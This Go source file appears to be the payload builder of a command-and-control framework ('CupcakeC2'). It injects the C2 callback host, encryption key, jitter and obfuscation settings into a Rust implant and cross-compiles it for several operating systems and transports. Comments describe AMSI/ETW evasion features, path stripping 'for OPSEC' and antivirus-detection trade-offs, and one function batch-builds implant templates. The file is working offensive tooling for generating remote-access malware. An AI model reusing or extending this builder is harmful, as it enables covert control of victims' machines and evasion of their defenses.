package services

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"cupcake-server/pkg/store"
	"cupcake-server/pkg/utils"

	"github.com/google/uuid"
)

const (
	SourceDir      = "../Client"           // Relative to server/
	BuildBaseDir   = "./temp_builds"      // Sandbox root
	ArtifactDir    = "./storage/payloads" // Final storage
	SharedTargetDir = "./storage/build_cache/target" // Shared cargo target directory
)

type PayloadConfig struct {
	Arch              string `json:"arch"`
	Protocol          string `json:"protocol"`
	Host              string `json:"host"`
	Port              string `json:"port"`
	AESKey            string `json:"aes_key"`
	HeartbeatInterval int    `json:"heartbeat_interval"`
	DNSResolver       string `json:"dns_resolver"`
	OSType            string `json:"os_type"`
	AutoDestruct      bool   `json:"auto_destruct"`
	SleepTime         int    `json:"sleep_time"`
	UseUPX            bool   `json:"use_upx"`
	EncryptionSalt    string `json:"encryption_salt"`
	ObfuscationMode   string `json:"obfuscation_mode"`
	Jitter            int    `json:"jitter"`
	// Capability profile: "minimal" | "standard" | "full" (default standard).
	// Maps to cargo features on the client:
	//   minimal  → transport + minimal post-ex (still includes Layer-A Nt process path on Windows)
	//   standard → PTY/SOCKS/plugin/BOF/.NET; Windows Layer-A hardened APIs always on
	//   full     → standard + stealth-adv (Layer-B: ETW/AMSI, NtCreateUserProcess with version gate + fallback)
	Profile string `json:"profile"`
}

// copyDir recursively copies a directory tree
func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil { return err }
		relPath, _ := filepath.Rel(src, path)
		
		// 🛡️ Skip target folders, git history, and other heavy/unnecessary files
		name := info.Name()
		if info.IsDir() && (name == "target" || name == ".git" || name == ".idea" || name == ".vscode") {
			return filepath.SkipDir
		}
		
		dstPath := filepath.Join(dst, relPath)
		if info.IsDir() { return os.MkdirAll(dstPath, info.Mode()) }
		
		sf, err := os.Open(path); if err != nil { return err }; defer sf.Close()
		df, err := os.Create(dstPath); if err != nil { return err }; defer df.Close()
		if _, err := io.Copy(df, sf); err != nil { return err }
		return os.Chmod(dstPath, info.Mode())
	})
}

// validateC2Host ensures the C2 callback host is a valid hostname or IP:port,
// without path separators or shell metacharacters that could cause code injection.
func validateC2Host(host string) error {
	if host == "" {
		return fmt.Errorf("C2 host is required")
	}
	// Reject path separators and shell metacharacters
	bad := []string{"/", "\\", ";", "&", "|", "`", "$", "\n", "\r", "\"", "'", "<", ">", "(", ")", "{", "}", "[", "]"}
	for _, ch := range bad {
		if strings.Contains(host, ch) {
			return fmt.Errorf("C2 host contains invalid character: %q", ch)
		}
	}
	return nil
}

const isolatedCargoHome = "./storage/build_cache/cargo_home"

// ensureIsolatedCargoHome creates a CARGO_HOME that ignores user ~/.cargo/config.toml
// (which often forces replace-with=ustc behind a dead 127.0.0.1 proxy), while reusing
// the user's registry/git caches via directory junctions (Windows) or symlinks.
func ensureIsolatedCargoHome(logChan chan<- string) (string, error) {
	home, err := filepath.Abs(isolatedCargoHome)
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(home, 0755); err != nil {
		return "", err
	}
	cfg := `# Isolated Cupcake build CARGO_HOME — no crates-io replace-with.
# Registry cache is linked from the user cargo home when available.
[registries.crates-io]
protocol = "sparse"

[net]
git-fetch-with-cli = true
`
	if err := os.WriteFile(filepath.Join(home, "config.toml"), []byte(cfg), 0644); err != nil {
		return "", err
	}

	userCargo := os.Getenv("CARGO_HOME")
	if userCargo == "" {
		if up := os.Getenv("USERPROFILE"); up != "" {
			userCargo = filepath.Join(up, ".cargo")
		} else if h := os.Getenv("HOME"); h != "" {
			userCargo = filepath.Join(h, ".cargo")
		}
	}
	for _, name := range []string{"registry", "git"} {
		src := filepath.Join(userCargo, name)
		dst := filepath.Join(home, name)
		if _, err := os.Stat(src); err != nil {
			continue
		}
		if fi, err := os.Lstat(dst); err == nil {
			// Already present (junction/dir) — keep
			_ = fi
			continue
		}
		if err := linkCargoCacheDir(src, dst); err != nil {
			if logChan != nil {
				logChan <- fmt.Sprintf("[Builder] 警告: 无法链接 cargo %s 缓存 (%v)，将使用独立缓存", name, err)
			}
		} else if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] 已链接用户 cargo/%s 缓存 → 隔离 CARGO_HOME", name)
		}
	}
	return home, nil
}

func linkCargoCacheDir(src, dst string) error {
	// Prefer Windows junction (no admin); fall back to symlink / plain copy skip.
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd", "/C", "mklink", "/J", dst, src)
		if out, err := cmd.CombinedOutput(); err != nil {
			return fmt.Errorf("mklink /J: %v (%s)", err, strings.TrimSpace(string(out)))
		}
		return nil
	}
	return os.Symlink(src, dst)
}

// cargoBuildEnv builds a clean environment for cargo: isolated CARGO_HOME, no dead proxies.
func cargoBuildEnv(absTargetDir, absWorkspace, cargoHome string) []string {
	base := os.Environ()
	strip := map[string]bool{
		"HTTP_PROXY": true, "HTTPS_PROXY": true, "ALL_PROXY": true,
		"http_proxy": true, "https_proxy": true, "all_proxy": true,
		"FTP_PROXY": true, "ftp_proxy": true,
		"CARGO_HOME": true, // replace below
	}
	out := make([]string, 0, len(base)+16)
	for _, kv := range base {
		eq := strings.IndexByte(kv, '=')
		if eq <= 0 {
			continue
		}
		key := kv[:eq]
		if strip[key] || strip[strings.ToUpper(key)] {
			continue
		}
		out = append(out, kv)
	}
	wireSeed := utils.WireSeed()
	// Neutral remap prefixes (no product brand in debug paths)
	out = append(out,
		"HTTP_PROXY=",
		"HTTPS_PROXY=",
		"ALL_PROXY=",
		"http_proxy=",
		"https_proxy=",
		"all_proxy=",
		"CARGO_TERM_COLOR=never",
		"CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse",
		fmt.Sprintf("CARGO_HOME=%s", cargoHome),
		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
		fmt.Sprintf("CUPCAKE_WIRE_SEED=%s", wireSeed),
		fmt.Sprintf("RUSTFLAGS=-C strip=symbols --remap-path-prefix %s=/src --remap-path-prefix %s=/home", absWorkspace, os.Getenv("USERPROFILE")),
	)
	return out
}

// runCargoBuild starts cargo with streaming logs; returns wait error.
func runCargoBuild(workspace string, args []string, env []string, logChan chan<- string) error {
	cmd := exec.Command("cargo", args...)
	cmd.Dir = workspace
	cmd.Env = env

	pipeReader, pipeWriter := io.Pipe()
	cmd.Stdout = pipeWriter
	cmd.Stderr = pipeWriter

	if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] 执行命令: cargo %s", strings.Join(args, " "))
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start cargo: %v", err)
	}

	go func() {
		scanner := bufio.NewScanner(pipeReader)
		// cargo lines can be long
		buf := make([]byte, 0, 64*1024)
		scanner.Buffer(buf, 1024*1024)
		for scanner.Scan() {
			line := scanner.Text()
			if logChan != nil {
				select {
				case logChan <- line:
				default:
				}
				if strings.Contains(line, "Compiling") && strings.Contains(line, "cupcake-core") {
					logChan <- "\x1b[35m[Builder] 编译阶段基本完成，正在进入全局链接与 LTO 体积优化阶段...\x1b[0m"
					logChan <- "\x1b[33m[Builder] 提示：该步涉及跨模块重组，耗时较长（约 30s），请耐心等待窗口自动弹出。\x1b[0m"
				}
			}
		}
		pipeReader.Close()
	}()

	waitErr := cmd.Wait()
	pipeWriter.Close()
	return waitErr
}

// BuildAgentWithLogger compiles the Rust agent in a sandboxed environment and streams logs
func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, error) {
	buildID := uuid.New().String()
	workspace := filepath.Join(BuildBaseDir, buildID)
	
	os.MkdirAll(BuildBaseDir, 0755)
	os.MkdirAll(ArtifactDir, 0755)
	os.MkdirAll(SharedTargetDir, 0755)

	if logChan != nil { logChan <- "[Builder] 正在准备沙箱环境 (已启用增量编译缓存)..." }
	if err := copyDir(SourceDir, workspace); err != nil {
		return "", fmt.Errorf("failed to create sandbox: %v", err)
	}
	defer os.RemoveAll(workspace)

	cargoHome, err := ensureIsolatedCargoHome(logChan)
	if err != nil {
		return "", fmt.Errorf("failed to prepare isolated CARGO_HOME: %v", err)
	}
	if logChan != nil {
		logChan <- "[Builder] 使用隔离 CARGO_HOME（忽略用户 ustc 镜像）；已清除 HTTP(S)_PROXY"
	}

	// 安全校验：防止 C2 Host 注入恶意内容到 Rust 源码
	if err := validateC2Host(conf.Host); err != nil {
		return "", fmt.Errorf("invalid C2 host: %v", err)
	}

	var connStr string
	protocol := strings.ToLower(conf.Protocol)
	if protocol == "tcp" {
		connStr = fmt.Sprintf("%s:%s", conf.Host, conf.Port)
	} else if protocol == "dns" {
		connStr = conf.Host 
	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
		connStr = fmt.Sprintf("bind://0.0.0.0:%s", conf.Port)
	} else if protocol == "wss" {
		connStr = fmt.Sprintf("wss://%s:%s/ws", conf.Host, conf.Port)
	} else {
		connStr = fmt.Sprintf("ws://%s:%s/ws", conf.Host, conf.Port)
	}

	if logChan != nil {
		logChan <- "[Builder] core engine init"
		logChan <- fmt.Sprintf("[Builder] wire_seed=%s (magics/Noise/module domain)", utils.WireSeed())
	}

	configPath := filepath.Join(workspace, "core", "src", "config.rs")
	if logChan != nil {
		logChan <- "[Builder] injecting endpoint + crypto config..."
	}

	// Fetch System AES Key if none provided
	aesKey := conf.AESKey
	if aesKey == "" {
		aesKey = store.GetSetting("system_aes_key")
		if logChan != nil {
			logChan <- "[Builder] using system AES material"
		}
	}
	// Per-build unique salt (PSK base AES stays listener-shared for Noise; salt isolates module KDF)
	salt := strings.TrimSpace(conf.EncryptionSalt)
	if salt == "" {
		if s, err := utils.RandomAlphaString(24); err == nil {
			salt = s
		} else {
			salt = fmt.Sprintf("s%016x", time.Now().UnixNano())
		}
		if logChan != nil {
			logChan <- "[Builder] minted unique KDF salt for this payload"
		}
	}

	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.Jitter, conf.DNSResolver, salt, conf.ObfuscationMode); err != nil {
		return "", fmt.Errorf("config patch failed: %v", err)
	}

	if logChan != nil {
		logChan <- "\x1b[32m[Builder] 配置注入成功! 准备构建受控端核心...\x1b[0m"
		logChan <- "\x1b[36m[Builder] 如果系统正在由于病毒查报导致文件被占用，以下过程可能会稍有延迟...\x1b[0m"
	}

	args := []string{"build", "-p", "cupcake-core", "--release"}
	target := ""
	// Determine Cargo Target based on OS and Arch Matrix
	if conf.OSType == "windows" {
		if runtime.GOOS == "linux" {
			if strings.Contains(conf.Arch, "amd64") {
				target = "x86_64-pc-windows-gnu"
			} else if strings.Contains(conf.Arch, "i386") {
				target = "i686-pc-windows-gnu"
			}
		} else {
			if strings.Contains(conf.Arch, "amd64") {
				target = "x86_64-pc-windows-msvc"
			} else if strings.Contains(conf.Arch, "i386") {
				target = "i686-pc-windows-msvc"
			}
		}
	} else if conf.OSType == "linux" {
		if strings.Contains(conf.Arch, "arm64") {
			target = "aarch64-unknown-linux-musl"
		} else if strings.Contains(conf.Arch, "arm") && !strings.Contains(conf.Arch, "arm64") {
			target = "armv7-unknown-linux-musleabihf"
		} else if strings.Contains(conf.Arch, "i386") {
			target = "i686-unknown-linux-musl"
		} else {
			target = "x86_64-unknown-linux-musl"
		}
	} else if conf.OSType == "darwin" {
		if strings.Contains(conf.Arch, "amd64") {
			target = "x86_64-apple-darwin"
		} else if strings.Contains(conf.Arch, "arm64") {
			target = "aarch64-apple-darwin"
		}
	}

	// Sanitize OS and Arch to prevent path traversal
	conf.OSType = filepath.Base(conf.OSType)
	conf.Arch = filepath.Base(conf.Arch)

	// Only append --target if cross-compiling
	if target != "" && (runtime.GOOS != conf.OSType || runtime.GOARCH != strings.Replace(conf.Arch, conf.OSType+"_", "", 1)) {
		args = append(args, "--target", target)
	}

	// Forward and reverse share the SAME capability tier: minimal
	//   shell/fs/proc/pty built-in; BOF/.NET via on-demand modules
	// Protocol only differs: bind → tcp_bind; reverse → ws/tcp/dns
	capProfile := "minimal"
	if p := strings.ToLower(strings.TrimSpace(conf.Profile)); p != "" {
		switch p {
		case "standard", "full":
			// Explicit legacy monolith only if forced
			capProfile = "standard"
		default:
			capProfile = "minimal"
		}
	}
	isBind := protocol == "bind-tcp" || protocol == "正向tcp"
	if logChan != nil {
		logChan <- fmt.Sprintf("[Builder] Cargo profile: %s", capProfile)
		if isBind {
			logChan <- "[Builder] 正向客户端 — tcp_bind + minimal（与反向同能力；BOF/.NET 按需模块）"
		} else {
			logChan <- "[Builder] 反向客户端 — minimal（终端/文件/进程内置；BOF/.NET 按需模块）"
		}
	}
	if protocol == "tcp" {
		args = append(args, "--no-default-features", "--features", "tcp,"+capProfile)
	} else if protocol == "bind-tcp" || protocol == "正向tcp" {
		args = append(args, "--no-default-features", "--features", "tcp_bind,"+capProfile)
	} else if protocol == "dns" {
		args = append(args, "--no-default-features", "--features", "dns,"+capProfile)
	} else if protocol == "wss" {
		args = append(args, "--no-default-features", "--features", "ws,ws-tls,"+capProfile)
	} else {
		args = append(args, "--no-default-features", "--features", "ws,"+capProfile)
	}

	if logChan != nil {
		modeStr := "全量构建"
		if _, err := os.Stat(SharedTargetDir); err == nil {
			modeStr = "增量加速模式"
		}
		logChan <- fmt.Sprintf("[Builder] 正在启动 Rust 编译器 (%s)...", modeStr)
		logChan <- "[Builder] 策略: 优先 --offline（本地 crates 缓存）→ 失败再在线拉取（已清除 HTTP_PROXY）"
	}

	// ⚡ OPTIMIZATION: centralized target dir; 🛡️ remap paths for OPSEC
	absTargetDir, _ := filepath.Abs(SharedTargetDir)
	absWorkspace, _ := filepath.Abs(workspace)
	env := cargoBuildEnv(absTargetDir, absWorkspace, cargoHome)

	// Offline-first: uses %USERPROFILE%\.cargo\registry (index.crates.io-*) when
	// no user-level replace-with points at a different empty index (e.g. ustc).
	offlineArgs := append(append([]string{}, args...), "--offline")
	if logChan != nil {
		logChan <- "[Builder] 尝试离线编译 (--offline)..."
	}
	waitErr := runCargoBuild(workspace, offlineArgs, env, logChan)
	if waitErr != nil {
		if logChan != nil {
			logChan <- fmt.Sprintf("[Builder] 离线未成功 (%v)，改为在线编译（无系统代理）...", waitErr)
		}
		waitErr = runCargoBuild(workspace, args, env, logChan)
		if waitErr != nil {
			return "", fmt.Errorf("cargo build failed: %v；若仍访问 ustc/代理失败：检查 ~/.cargo/config.toml 的 replace-with，或运行 Client/scripts/cargo-use-local-cache.ps1", waitErr)
		}
	}

	binaryName := "cupcake-core"
	if conf.OSType == "windows" { binaryName += ".exe" }

	// 🔍 Find the built binary
	var builtPath string
	if target != "" && (runtime.GOOS != conf.OSType || runtime.GOARCH != strings.Replace(conf.Arch, conf.OSType+"_", "", 1)) {
		builtPath = filepath.Join(absTargetDir, target, "release", binaryName)
	} else {
		builtPath = filepath.Join(absTargetDir, "release", binaryName)
	}

	if _, err := os.Stat(builtPath); err != nil {
		return "", fmt.Errorf("binary not found at %s: ensure 'cupcake-core' package is correctly configured", builtPath)
	}

	ext := ""
	if conf.OSType == "windows" { ext = ".exe" }
	randSuffix, _ := utils.RandomAlphaString(8)
	finalPath := filepath.Join(ArtifactDir, fmt.Sprintf("%s%s", randSuffix, ext))


	if logChan != nil { logChan <- "[Builder] 正在对本地 Loader 执行配置补丁..." }
	if err := moveFile(builtPath, finalPath); err != nil { return "", fmt.Errorf("failed to save artifact: %v", err) }

	// 📦 UPX 压缩（默认关闭：现代 AV 对 UPX 特征极敏感，几乎是负优化）
	// 仅在用户明确勾选 UseUPX 时执行。
	if conf.UseUPX {
		if logChan != nil {
			logChan <- "[Builder] 警告: UPX 会显著提高 AV 检出率，仅建议在实验环境使用..."
			logChan <- "[Builder] 正在执行 UPX 压缩..."
		}
		if err := RunUPX(finalPath); err != nil {
			if logChan != nil { logChan <- "[!] UPX 失败: " + err.Error() }
		} else {
			if logChan != nil { logChan <- "[+] UPX 压缩成功" }
		}
	}

	if logChan != nil { logChan <- "[Builder] 构建成功!" }
	return finalPath, nil
}

// RunUPX 执行 UPX 压缩
func RunUPX(path string) error {
	cmd := exec.Command("upx", "-9", "--force", path)
	return cmd.Run()
}

// RebuildTemplates (v3.0.1 Engine)
// This function rebuilds all standard platform templates and moves them to server/assets
// enabling the 'Patch' mode to always use the latest v3.0.1 features.
func RebuildTemplates(logChan chan<- string) error {
	if logChan != nil { logChan <- "[Rebuilder] 启动 CupcakeC2 v3.0.1 全平台模板自动化构建任务..." }
	
	targets := []struct {
		OS       string
		Arch     string
		Protocol string
		OutName  string
		Profile  string
	}{
		{"windows", "amd64", "ws", "client_template_windows.exe", "standard"},
		{"windows", "i386", "ws", "client_template_windows_x86.exe", "standard"},
		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe", "standard"},
		{"windows", "amd64", "tcp", "client_template_windows_tcp_minimal.exe", "minimal"},
		{"windows", "amd64", "dns", "client_template_windows_dns.exe", "standard"},
		{"windows", "amd64", "bind-tcp", "client_template_windows_bind.exe", "standard"},
		{"linux", "amd64", "ws", "client_template_linux", "standard"},
		{"linux", "amd64", "tcp", "client_template_linux_tcp", "standard"},
		{"linux", "amd64", "tcp", "client_template_linux_tcp_minimal", "minimal"},
		{"linux", "arm64", "ws", "client_template_linux_arm64", "standard"},
	}

	for _, t := range targets {
		conf := PayloadConfig{
			OSType:            t.OS,
			Arch:              t.Arch,
			Protocol:          t.Protocol,
			Host:              "127.0.0.1",
			Port:              "8080",
			AESKey:            "SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_", // Default placeholder
			HeartbeatInterval: 10,
			Profile:           t.Profile,
			UseUPX:            false,
		}
		
		if logChan != nil { logChan <- fmt.Sprintf("[Rebuilder] 正在编译模板: %s...", t.OutName) }
		path, err := BuildAgentWithLogger(conf, nil)
		if err != nil {
			if logChan != nil { logChan <- fmt.Sprintf("[!] 模板编译失败 (%s): %v", t.OutName, err) }
			continue
		}
		
		// Move to assets
		dest := filepath.Join("assets", t.OutName)
		if err := os.Rename(path, dest); err != nil {
			// Try copy if rename fails across partitions
			if err := copyFile(path, dest); err == nil {
				os.Remove(path)
			}
		}
		if logChan != nil { logChan <- fmt.Sprintf("[+] 模板已就绪: assets/%s", t.OutName) }
	}

	if logChan != nil { logChan <- "[Rebuilder] v3.0.1 模板集更新完成。" }
	return nil
}

// Extension of services to support cloning for shellcode
func copyFile(src, dst string) error {
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	_, err = io.Copy(df, sf)
	return err
}

func patchConfig(path, connStr, aesKey string, heartbeat int, jitter int, dnsResolver string, salt string, obfMode string) error {
	content, err := os.ReadFile(path)
	if err != nil { return err }
	s := string(content)

	// 1. URL Patch (Static only)
	s = strings.Replace(s, "REPLACE_ME_URL", connStr, 1)
	
	// 2. AES Key Patch (Static only)
	if aesKey != "" {
		if !isValidAESKeyString(aesKey) {
			return fmt.Errorf("AES key must be 32 bytes ASCII or 64 hex characters")
		}
		s = strings.Replace(s, "REPLACE_ME_AES_KEY", aesKey, 1)
	}

	// 3. Encryption Salt & Obfuscation
	// In Source Patching mode, we ONLY replace the constants.
	// Do NOT touch SYSTEM_PROVIDER_CRYPTO_KDF_SALT or OBF_MODE_STRICT in source code
	// because they are fixed-size arrays and changing their literal length breaks compilation.
	s = strings.Replace(s, "REPLACE_ME_SALT", salt, 1)
	
	// 4. Jitter Patch
	jitterStr := fmt.Sprintf("%d", jitter)
	s = strings.Replace(s, "REPLACE_ME_JITTER", jitterStr, 1)
	
	obfVal := strings.ToLower(obfMode)
	if obfVal == "" { obfVal = "none" }
	s = strings.Replace(s, "REPLACE_ME_OBF", obfVal, 1)
	
	return os.WriteFile(path, []byte(s), 0644)
}

func isValidAESKeyString(key string) bool {
	key = strings.TrimSpace(key)
	if len(key) == 32 {
		return true
	}
	if len(key) == 64 && isHexString(key) {
		return true
	}
	return false
}

func moveFile(src, dst string) error {
	if err := os.Rename(src, dst); err == nil { return nil }
	sf, err := os.Open(src); if err != nil { return err }; defer sf.Close()
	df, err := os.Create(dst); if err != nil { return err }; defer df.Close()
	if _, err := io.Copy(df, sf); err != nil { return err }
	return os.Remove(src)
}
